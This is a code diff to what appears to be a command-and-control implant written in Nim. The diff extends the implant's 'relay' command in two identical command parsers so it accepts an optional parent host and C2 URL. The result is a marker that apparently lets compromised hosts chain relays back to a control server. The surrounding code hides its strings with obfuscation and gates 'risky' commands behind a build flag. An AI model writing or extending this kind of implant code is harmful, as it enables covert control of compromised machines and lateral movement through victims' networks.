@@ -72,18 +72,25 @@ proc parseCmdRelay*(cmd : string, cmdGuid : string, args : seq[string]) : string
         elif cmd == obf("whoami"):
             result = whoami()
         elif cmd == obf("relay"):
-            # Start HTTP relay server with specified port
+            # Start HTTP relay server with specified port, optional parent and c2Url
+            # Usage: relay <PORT> [parent_host:port] [c2_url]
             if args.len < 1:
-                result = obf("ERROR: relay command requires port number. Usage: relay <PORT>")
+                result = obf("ERROR: relay command requires port number. Usage: relay <PORT> [parent_host:port] [c2_url]")
             else:
                 try:
                     let port = parseInt(args[0])
                     if port < 1 or port > 65535:
                         result = obf("ERROR: Invalid port number. Must be between 1-65535")
                     else:
-                        result = "RELAY_START:" & $port  # Special marker for main.nim to start server
+                        # Build marker with optional parent and c2Url
+                        var marker = "RELAY_START:" & $port
+                        if args.len >= 2 and args[1] != "":
+                            marker = marker & "|PARENT:" & args[1]
+                        if args.len >= 3 and args[2] != "":
+                            marker = marker & "|C2:" & args[2]
+                        result = marker  # Special marker for main.nim to start server
                 except ValueError:
-                    result = obf("ERROR: Invalid port number. Usage: relay <PORT>")
+                    result = obf("ERROR: Invalid port number. Usage: relay <PORT> [parent_host:port] [c2_url]")
         else:
             when defined debug:
                 echo "[DEBUG] ❌ ┌─────────── CMDPARSER NO MATCH ───────────┐"
@@ -167,18 +174,25 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
         elif cmd == obf("whoami"):
             result = whoami()
         elif cmd == obf("relay"):
-            # Start HTTP relay server with specified port
+            # Start HTTP relay server with specified port, optional parent and c2Url
+            # Usage: relay <PORT> [parent_host:port] [c2_url]
             if args.len < 1:
-                result = obf("ERROR: relay command requires port number. Usage: relay <PORT>")
+                result = obf("ERROR: relay command requires port number. Usage: relay <PORT> [parent_host:port] [c2_url]")
             else:
                 try:
                     let port = parseInt(args[0])
                     if port < 1 or port > 65535:
                         result = obf("ERROR: Invalid port number. Must be between 1-65535")
                     else:
-                        result = "RELAY_START:" & $port  # Special marker for main.nim to start server
+                        # Build marker with optional parent and c2Url
+                        var marker = "RELAY_START:" & $port
+                        if args.len >= 2 and args[1] != "":
+                            marker = marker & "|PARENT:" & args[1]
+                        if args.len >= 3 and args[2] != "":
+                            marker = marker & "|C2:" & args[2]
+                        result = marker  # Special marker for main.nim to start server
                 except ValueError:
-                    result = obf("ERROR: Invalid port number. Usage: relay <PORT>")
+                    result = obf("ERROR: Invalid port number. Usage: relay <PORT> [parent_host:port] [c2_url]")
         else:
             # Parse risky commands, if enabled
             when defined risky:
